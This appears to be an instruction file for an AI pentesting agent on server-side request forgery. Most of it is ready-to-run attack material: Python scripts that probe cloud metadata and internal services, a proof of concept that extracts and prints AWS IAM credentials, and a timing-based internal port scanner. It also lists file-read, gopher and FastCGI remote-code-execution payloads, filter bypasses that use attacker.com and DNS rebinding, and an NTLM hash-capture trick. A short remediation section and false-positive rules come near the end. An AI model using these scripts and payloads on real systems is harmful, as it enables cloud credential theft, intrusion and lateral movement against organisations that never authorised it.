---
name: ssrf
description: Elite SSRF testing with cloud metadata exploitation, internal service access, protocol abuse, mandatory OOB+internal-resource dual confirmation, UI navigation steps, and strict false-positive rejection for DNS-only callbacks
---

# SSRF — Server-Side Request Forgery

SSRF enables the server to make requests to internal networks and services that are inaccessible to the attacker directly. The real impact of SSRF is stealing cloud credentials, accessing internal admin panels, lateral movement into Kubernetes/service meshes, and — in advanced cases — remote code execution.

**CRITICAL RULE: A DNS-only OOB callback is informational evidence of SSRF. It is NOT a Critical or High finding alone. To report Critical/High SSRF, you must demonstrate access to an internal resource or retrieve cloud credentials. DNS callback alone = Informational/Low SSRF (Blind SSRF with limited impact).**

---

## Real Impact Gate — Answer Before Reporting

1. **What internal resource was accessed?**
   - Cloud metadata (AWS/GCP/Azure IAM credentials): Critical
   - Internal admin panel, database, or service: High/Critical
   - Internal HTTP service on localhost: High
   - DNS callback only, no internal resource: Low/Informational

2. **What data was retrieved or what action was performed?**
   - AWS IAM temporary credentials retrieved: Critical → can access S3, EC2, etc.
   - Kubernetes service account token retrieved: Critical
   - Internal API response containing sensitive data: High
   - Port scan results only: Low/Informational

3. **Have you confirmed with two signals?**
   - Signal 1: OOB DNS/HTTP callback confirming server makes outbound requests
   - Signal 2: Actual internal resource response (cloud metadata, internal API, etc.)
   - DNS alone is only ONE signal → cannot report Critical/High → must get Signal 2

4. **Is this server-side or client-side fetch?**
   - Server-side: the server fetches the URL → SSRF
   - Client-side: browser fetches the URL → NOT SSRF (possibly XSS issue)
   - Confirm: use a non-browser-accessible URL (internal IP like 169.254.169.254) — if it responds, it's server-side

---

## Attack Surface — Every URL-Accepting Feature

### Direct URL Parameters (Obvious)
- `?url=`
- `?link=`
- `?fetch=`
- `?src=`
- `?href=`
- `?target=`
- `?redirect=`
- `?webhook=`
- `?callback=`
- `?endpoint=`
- `?destination=`
- `?image_url=` / `?avatar=` / `?photo=`

### Indirect URL Features (Less Obvious — Often Missed)
- **Link preview / Open Graph**: paste a URL, app fetches og:title/og:image
- **PDF generators**: wkhtmltopdf or headless Chrome fetching HTML content with user-supplied URL
- **Document importers**: import from Google Docs URL, Dropbox URL, custom URL
- **Image processing**: fetch image from URL for resize/watermark/compression
- **Webhook configuration**: configure webhook URL for event notifications
- **Server-side analytics tracking**: Referer URL processed server-side
- **Calendar importers**: ICS file URL
- **Package managers / dependency resolvers**: resolving npm/pip packages from custom registry URL
- **Health check / monitoring endpoints**: configure URL for monitoring system to poll
- **Video/media embedding**: fetch OEmbed data from user-supplied URL
- **Email template with links**: email system follows links in templates
- **Sitemap generation**: app fetches pages specified in user-provided sitemap URL
- **GraphQL resolvers**: resolver that fetches from a URL field

### UI Navigation for SSRF Discovery:
```
Step 1: Log in to the application
Step 2: Navigate to every section and look for URL input fields:
  - Profile → Avatar: "Upload via URL" option
  - Settings → Integrations/Webhooks: "Configure webhook URL"
  - Import → "Import from URL" or "Import from Google Drive"
  - Posts/Content → "Embed/Preview URL"
  - Admin → "Health check URL"
Step 3: In proxy history, look for requests that contain:
  - Parameters named url, link, src, href, target, redirect, fetch, callback
  - Requests that clearly fetch external content based on user input
  - Base64-encoded URLs or JSON-encoded URL values
Step 4: Review all JavaScript files for URL-fetching functionality
Step 5: Check API documentation for any URL-accepting endpoints
```

---

## Testing Methodology

### Step 1: Set Up OOB Infrastructure

```bash
# Start interactsh listener for OOB callbacks
interactsh-client -server https://interactsh.com -n 1 -o /workspace/interactsh.txt &
# Note the unique interaction domain: xxxxxxxxx.oast.fun

# Alternative: use ngrok tunnel to controlled server
# Or use requestbin.com / webhook.site for manual testing
```

### Step 2: Basic SSRF Detection

```python
import requests, time

INTERACTSH_DOMAIN = "YOUR-UNIQUE-ID.oast.fun"

def test_ssrf_basic(endpoint, param_name, session_cookie):
    """Basic SSRF detection via OOB callback"""
    
    ssrf_payloads = [
        f"http://{INTERACTSH_DOMAIN}/ssrf-{param_name}",
        f"https://{INTERACTSH_DOMAIN}/ssrf-{param_name}",
        f"http://{INTERACTSH_DOMAIN}:8080/ssrf-{param_name}",
    ]
    
    for payload in ssrf_payloads:
        r = requests.post(endpoint,
            json={param_name: payload},
            cookies={"session": session_cookie})
        print(f"Sent: {payload} → Status: {r.status_code}")
    
    # Wait for OOB callbacks
    time.sleep(5)
    print("Check interactsh.txt for incoming DNS/HTTP callbacks")
    
    # Alternatively, monitor interactsh output directly
```

### Step 3: Internal Resource Access (MANDATORY for High/Critical)

If OOB callback received, escalate to accessing internal resources:

```python
def test_ssrf_internal_targets(endpoint, param_name, session_cookie):
    """Test access to high-value internal targets"""
    
    # Cloud metadata endpoints
    cloud_targets = [
        # AWS IMDSv1 (no authentication needed)
        ("AWS_IMDSv1_base", "http://169.254.169.254/latest/meta-data/"),
        ("AWS_IMDSv1_credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS_IMDSv1_userdata", "http://169.254.169.254/latest/user-data/"),
        ("AWS_IMDSv1_hostname", "http://169.254.169.254/latest/meta-data/hostname"),
        # GCP metadata (requires header: Metadata-Flavor: Google)
        ("GCP_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("GCP_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
        # Azure metadata (requires header: Metadata: true)
        ("Azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        # Internal services
        ("localhost_80", "http://127.0.0.1/"),
        ("localhost_8080", "http://127.0.0.1:8080/"),
        ("localhost_8443", "https://127.0.0.1:8443/"),
        ("localhost_3000", "http://127.0.0.1:3000/"),
        ("localhost_5000", "http://127.0.0.1:5000/"),
        ("redis", "http://127.0.0.1:6379/"),
        ("elasticsearch", "http://127.0.0.1:9200/"),
        ("kubernetes_api", "https://kubernetes.default.svc/"),
        ("docker_api", "http://localhost:2375/v1.24/containers/json"),
    ]
    
    for name, url in cloud_targets:
        r = requests.post(endpoint,
            json={param_name: url},
            cookies={"session": session_cookie},
            timeout=10)
        
        # Analyze response for signs of internal data
        if r.status_code == 200 and len(r.text) > 20:
            body = r.json() if "json" in r.headers.get("content-type", "") else r.text
            
            # Check for AWS metadata indicators
            if any(k in str(body) for k in ["ami-id", "instance-id", "iam", "AccessKeyId", "SecretAccessKey"]):
                print(f"AWS METADATA ACCESS CONFIRMED: {name}")
                print(f"Response: {str(body)[:500]}")
                return True, name, str(body)
            
            # Check for Kubernetes indicators
            if any(k in str(body) for k in ["apiVersion", "kind", "namespace", "ClusterIP"]):
                print(f"KUBERNETES API ACCESS CONFIRMED: {name}")
                return True, name, str(body)
            
            # Check for other internal service indicators
            if len(r.text) > 50:
                print(f"Internal target {name} returned data: {r.text[:200]}")
        
        elif r.status_code == 403 or r.status_code == 401:
            print(f"Internal target {name}: Authentication required (SSRF confirmed but credentials block)")
    
    return False, None, None
```

### Step 4: AWS Credential Extraction Chain

```python
def extract_aws_credentials(endpoint, param_name, session_cookie):
    """Full AWS credential extraction chain via SSRF"""
    
    # Step 1: Get IAM role name
    r = requests.post(endpoint,
        json={param_name: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        cookies={"session": session_cookie})
    
    if r.status_code != 200 or not r.text:
        print("Cannot access IAM credentials endpoint")
        return None
    
    # Extract role name from response
    # Response might be in JSON or plain text depending on how the app processes it
    role_name = r.text.strip()
    print(f"IAM Role name: {role_name}")
    
    # Step 2: Get temporary credentials for this role
    r2 = requests.post(endpoint,
        json={param_name: f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"},
        cookies={"session": session_cookie})
    
    print(f"IAM Credentials response: {r2.text[:500]}")
    return r2.text
```

### Step 5: Protocol Variations

```python
protocol_payloads = [
    # File read
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    # Gopher (speak raw protocols)
    "gopher://127.0.0.1:6379/_INFO",  # Redis INFO command
    "gopher://127.0.0.1:25/_HELO%20attacker.com",  # SMTP
    # Dict protocol
    "dict://127.0.0.1:6379/INFO",  # Redis
    # FTP
    "ftp://127.0.0.1:21/",
    # Internal IP variations
    "http://0.0.0.0/",  # 0.0.0.0 often maps to localhost
    "http://0/",
    "http://[::]",  # IPv6 any
    "http://[::1]/",  # IPv6 localhost
    "http://0x7f000001/",  # 127.0.0.1 in hex
    "http://2130706433/",  # 127.0.0.1 in decimal
    "http://0177.0.0.1/",  # 127.0.0.1 in octal
]
```

---

## Blind SSRF Escalation

When only DNS/HTTP callbacks are received (no internal data), escalate:

```python
# Port scanning via blind SSRF timing
def ssrf_port_scan(endpoint, param_name, session_cookie, target_ip="127.0.0.1"):
    """Use timing differences to map open ports via blind SSRF"""
    import time, statistics
    
    common_ports = [21, 22, 80, 443, 3000, 3306, 5000, 5432, 6379, 8080, 8443, 9200, 27017]
    open_ports = []
    
    for port in common_ports:
        times = []
        for _ in range(3):
            start = time.time()
            try:
                r = requests.post(endpoint,
                    json={param_name: f"http://{target_ip}:{port}/"},
                    cookies={"session": session_cookie},
                    timeout=5)
                times.append(time.time() - start)
            except requests.Timeout:
                times.append(5.0)
        
        avg_time = statistics.mean(times)
        # Open ports respond faster (TCP SYN-ACK) vs closed (RST) vs filtered (timeout)
        print(f"Port {port}: avg {avg_time:.2f}s")
        if avg_time < 1.0:  # Faster than expected → likely open
            open_ports.append(port)
    
    print(f"Likely open ports: {open_ports}")
    return open_ports
```

---

## Bypass Techniques

```python
bypass_payloads = {
    # Decimal IP
    "decimal_localhost": "http://2130706433/",
    # Hex IP
    "hex_localhost": "http://0x7f000001/",
    # Octal IP
    "octal_localhost": "http://0177.0.0.1/",
    # IPv6
    "ipv6_localhost": "http://[::1]/",
    "ipv6_mapped": "http://[::ffff:127.0.0.1]/",
    # 0.0.0.0
    "zero_ip": "http://0.0.0.0/",
    # URL confusion
    "at_bypass": "http://attacker.com@127.0.0.1/",
    "hash_bypass": "http://127.0.0.1#@attacker.com/",
    # Redirect chain
    "redirect": "http://attacker.com/redirect_to_169.254.169.254",
    # DNS rebinding
    "rebinding": "http://ssrf.attacker.com/",  # Resolves to 127.0.0.1 on second lookup
}
```

---

## UI Reproduction Steps — Required in Every Report

```
AWS CREDENTIALS THEFT VIA SSRF:

DISCOVERY:
Step 1: Log in to the application
Step 2: Navigate to Profile → Edit Profile
Step 3: Look for "Profile Picture URL" or "Import from URL" field
Step 4: Observe the field accepts a URL for importing profile picture from external source
Step 5: Enter URL: https://legitimate-image.com/test.jpg → verify it works normally
Step 6: Screenshot: Profile picture imported from URL successfully

EXPLOITATION:
Step 7: In the same field, enter:
        http://169.254.169.254/latest/meta-data/iam/security-credentials/
Step 8: Click "Save" or "Import"
Step 9: Observe the response — instead of importing an image, the server returns:
        {"role_name": "ec2-webapp-role"}  (or similar)
        Screenshot: Response showing IAM role name

Step 10: Enter next URL:
         http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-webapp-role
Step 11: Click "Save" or "Import"
Step 12: Observe response contains AWS temporary credentials:
         {
           "AccessKeyId": "ASIA...",
           "SecretAccessKey": "...",
           "Token": "...",
           "Expiration": "2024-01-15T15:30:00Z"
         }
Step 13: Screenshot: AWS credentials displayed in application response

IMPACT DEMONSTRATION:
Step 14: Use extracted credentials to verify AWS access:
         AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity
Step 15: Screenshot: AWS API confirming the credentials are valid and showing the IAM role's permissions
```

---

## Complete Report Format

**TITLE**: SSRF in Profile Picture Import — AWS IAM Credentials Exfiltrated via Cloud Metadata

**SEVERITY**: Critical

**RAW HTTP REQUEST**:
```
POST /api/user/import-avatar HTTP/1.1
Host: target.com
Cookie: session=USER_SESSION
Content-Type: application/json

{"avatar_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-webapp-role"}
```

**RAW HTTP RESPONSE**:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "data": {
    "Code": "Success",
    "LastUpdated": "2024-01-15T10:00:00Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "AQoDYXdzEJr...[truncated]",
    "Expiration": "2024-01-15T16:00:00Z"
  }
}
```

**EXACT LOCATION**:
- URL: POST https://target.com/api/user/import-avatar
- Vulnerable parameter: `avatar_url` in JSON body
- UI location: Dashboard → Profile → Edit Profile → Profile Picture → "Import from URL" field
- SSRF type: Direct SSRF with full response visibility (non-blind)
- Cloud: AWS EC2 instance with IMDSv1 enabled

**WORKING POC**:
```python
#!/usr/bin/env python3
"""SSRF → AWS Credential Theft PoC"""
import requests, json

TARGET = "https://target.com"
SESSION = "USER_SESSION_COOKIE_HERE"

def get_iam_credentials():
    # Step 1: Get role name
    r1 = requests.post(f"{TARGET}/api/user/import-avatar",
        json={"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        cookies={"session": SESSION})
    role_name = r1.json().get("data", "").strip()
    print(f"[+] IAM Role: {role_name}")
    
    # Step 2: Get credentials
    r2 = requests.post(f"{TARGET}/api/user/import-avatar",
        json={"avatar_url": f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"},
        cookies={"session": SESSION})
    creds = r2.json().get("data", {})
    print(f"[+] AccessKeyId: {creds.get('AccessKeyId')}")
    print(f"[+] SecretAccessKey: {creds.get('SecretAccessKey')}")
    print(f"[+] Token: {creds.get('Token', '')[:50]}...")
    return creds

get_iam_credentials()
```

**VALIDATION**:
- Signal 1: OOB interactsh DNS callback received when sending http://INTERACTSH-DOMAIN/ → confirmed server makes outbound HTTP requests
- Signal 2: Request to http://169.254.169.254/latest/meta-data/iam/security-credentials/ returned HTTP 200 with JSON body containing IAM role name "ec2-webapp-role" — this is the AWS EC2 Instance Metadata Service response, only accessible from within the EC2 instance
- Signal 3 (bonus): AWS IAM credentials retrieved from the role and verified valid via `aws sts get-caller-identity` — confirms the credentials have actual AWS API access

**REAL IMPACT**:
The SSRF vulnerability allows any authenticated user to force the web server to make HTTP requests to the AWS Instance Metadata Service. By accessing the IMDSv1 endpoint at 169.254.169.254, the attacker retrieved temporary AWS IAM credentials for the role "ec2-webapp-role". These credentials grant access to all AWS services that the role is authorized for (determined by the role's IAM policy — which may include S3, RDS, EC2, Secrets Manager, etc.). With these credentials, an attacker can: read and write data in S3 buckets (including backup files, user uploads, exported data), access other EC2 instances in the same VPC, read secrets from AWS Secrets Manager, and potentially perform lateral movement across the entire AWS infrastructure. This represents a critical breach of cloud infrastructure security.

**RECOMMENDED FIX**:
1. Primary: Validate and allowlist URLs before making server-side requests — only allow specific trusted domains, reject all IP addresses and non-HTTPS URLs:
   ```python
   import ipaddress, urllib.parse
   def is_safe_url(url):
       parsed = urllib.parse.urlparse(url)
       hostname = parsed.hostname
       try:
           ip = ipaddress.ip_address(hostname)
           if ip.is_private or ip.is_loopback or ip.is_link_local: return False
       except ValueError: pass
       allowed_domains = ['cdn.example.com', 'images.example.com']
       return any(hostname.endswith(d) for d in allowed_domains)
   ```
2. Secondary: Enable IMDSv2 on all EC2 instances (requires PUT request with header to get token first — not vulnerable to simple SSRF):
   ```bash
   aws ec2 modify-instance-metadata-options --instance-id i-xxxx --http-tokens required
   ```
3. Secondary: Isolate the web server from the instance metadata service using network firewall rules
4. Verification: After fix, confirm that requests to 169.254.169.254 return an error from the application, not the metadata content

---

## SSRF Impact Classification

| What was achieved | Severity |
|-------------------|----------|
| AWS/GCP/Azure IAM credentials retrieved | Critical |
| Kubernetes service account token retrieved | Critical |
| Internal admin panel accessed and data read | Critical/High |
| Internal service accessed (Redis/Elasticsearch/RabbitMQ) and data read | High |
| Internal web server response retrieved | High |
| Local file read via file:// | High |
| Port scan results only | Medium |
| DNS/HTTP callback confirmed but no internal data | Low/Informational |

---

## False Positive Rejection Rules

- DNS callback only, no internal resource access: Informational / Low — NOT Critical or High
- SSRF to external server that attacker already controls: Low (no internal access demonstrated)
- Client-side URL fetch (browser fetches the URL, not the server): NOT SSRF
- Server validates all outbound URLs against allowlist: confirmed not exploitable → rejected
- SSRF to time.cloudflare.com or similar explicitly allowed external services: by design, not a vulnerability
- Response shows the server attempted to fetch but was blocked (connection refused, DNS failure on internal addresses): indicates WAF/network controls — document and continue testing bypass techniques before giving up


## Additional Techniques — ported from WebSkills (writeup-techniques/ssrf)

Corpus-derived vectors and bypasses that go beyond the AWS-IMDS happy path already documented above. All additive — use alongside the existing methodology, OOB setup, and false-positive rules.

### Parser-confusion host bypass (validator vs fetch-library divergence)
Simple string checks "see" the trusted host; the URL parser connects elsewhere. Exploits backend validator (RFC 3986) vs fetch library (WHATWG/browser) divergence — also hits Node/PHP URL-parser mismatches.
```
https://trusted.tld@127.0.0.1/            userinfo — navigates to 127.0.0.1
https://trusted.tld\@attacker.tld/        backslash trick (WHATWG vs RFC3986)
https://evil.com[@127.0.0.1/              bracket — SSRF side (Spring vs Java URL mismatch)
https://127.0.0.1[@evil.com               bracket — open-redirect side (Spring CVE-2024-22243)
http://127.0.0.1#trusted.tld/   http://127.0.0.1%23@trusted.tld/   (fragment)
http://127.0.0.1%2f%2f..%2f@trusted       satisfy a "must contain path" validator
```

### Wildcard-DNS → loopback (defeat "must be a subdomain of X" allow-lists)
Public DNS names that resolve to 127.0.0.1 / internal, so they pass host-suffix allow-lists:
```
127.0.0.1.sslip.io   lvh.me   localtest.me   traefik.me   nip.io   xip.io
localhost.   LOCALHOST   127.0.0.1.   (trailing dot / case-variation)
```
Also **enclosed-alphanumeric / "bubble-text"** Unicode look-alike digits that normalize to the IP after processing — used when a regex blocks ASCII digits.

### AWS ECS / EKS container credentials (beyond EC2 IMDS)
From inside a container you can often reach BOTH the container IAM role AND the EC2 role.
```
ECS:  http://169.254.170.2/v2/credentials/<GUID>
      GUID = env AWS_CONTAINER_CREDENTIALS_RELATIVE_URI  (read via SSRF/LFI/path-traversal)
EKS Pod Identity:  read AWS_CONTAINER_CREDENTIALS_FULL_URI + AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE
      then GET the local credential endpoint with the projected SA token as Authorization header
```

### Cloud metadata nuances not to miss
- **GCP beta path needs no header** (the standard path requires `Metadata-Flavor: Google`):
  `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
  Also add an SSH key: `.../computeMetadata/v1/project/attributes/ssh-keys`
- **Azure managed identity** — select a specific MI with `client_id` / `object_id` / `msi_res_id`:
  `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` (header `Metadata: true`)
- **OpenStack**: `http://169.254.169.254/openstack`

### Gopher → raw-TCP RCE breadth (beyond Redis/SMTP)
`gopher://` sends arbitrary bytes to any TCP port; CRLF must be double-encoded (`%0d%0a`→`%250d%250a` inside the fetched URL). Generate with **Gopherus** (`--exploit fastcgi|redis|mysql|smtp|mongodb`), **SSRFmap**, or `remote-method-guesser --ssrf --gopher` (Java RMI).
- **FastCGI (PHP-FPM :9000 RCE):** craft a FastCGI record setting `SCRIPT_FILENAME` + `PHP_VALUE` (`auto_prepend_file php://input`, `allow_url_include`) → code exec.
- **uWSGI magic vars:** raw uwsgi protocol on the internal socket → inject `UWSGI_FILE` to load/execute an attacker WSGI app.
- **MongoDB / Java RMI** command injection over gopher; Redis `CONFIG SET dir`+`dbfilename`+`SAVE` or `SLAVEOF` module-load → webshell/cron/SSH-key.

### TLS-layer SSRF (fires before HTTP logic)
- **SNI SSRF** — when Nginx uses `$ssl_preread_server_name` / SNI as `proxy_pass` target, set the SNI to an internal host:
  `openssl s_client -connect target:443 -servername 127.0.0.1`
- **AIA CA-Issuers SSRF (Java mTLS)** — Java with AIA fetching auto-downloads the CA-Issuers URI from a *client* certificate during the handshake. Present a client cert whose AIA points at an internal/collab URL → SSRF during cert validation; `file://` AIA → DoS (unbounded read).

### CSS pre-processor SSRF (LESS / SCSS)
Attacker-controlled `@import (inline) "http://169.254.169.254/…"` fetches remote/`file://` resources; a marker URI eases exfil of the fetched content into the compiled CSS. (SugarCRM ≤14.0.0.)

### SSRF → NTLM hash leak (Windows)
Coerce `file://` / UNC (`\\attacker\share`) → NTLM negotiation leaks the server-account hash (e.g. DNN CVE-2025-52488). Capture with Responder.

### Tooling add-ons
`Gopherus`, `SSRFmap`, `Singularity of Origin` (DNS-rebind: authoritative DNS + HTTP + ready payloads; used to beat BentoML's 2025 "safe URL" patch), `Burp-Encode-IP` (auto IP re-encodings), `Collaborator Everywhere` (finds header-driven SSRF via `Referer`/analytics), `recollapse` (regex-evasion fuzz), PortSwigger **URL-validation-bypass cheat sheet**, `Pacu` (AWS post-ex once creds land).

### Provenance to cite (impact framing)
Dropbox "Full Response SSRF via Google Drive" $17,576 · GitLab "SSRF via remote_attachment_url on a Note" $10,000 · Vimeo GCP SSH-key exfil $5,000 · Shopify "SSRF in Exchange → ROOT on all instances" · IBB libuv $4,860 · Keycloak `request_uri` unauth blind SSRF (EDB-50405). Lead with the highest proven pivot: cloud-cred theft > internal admin/API read > port scan > blind OOB.
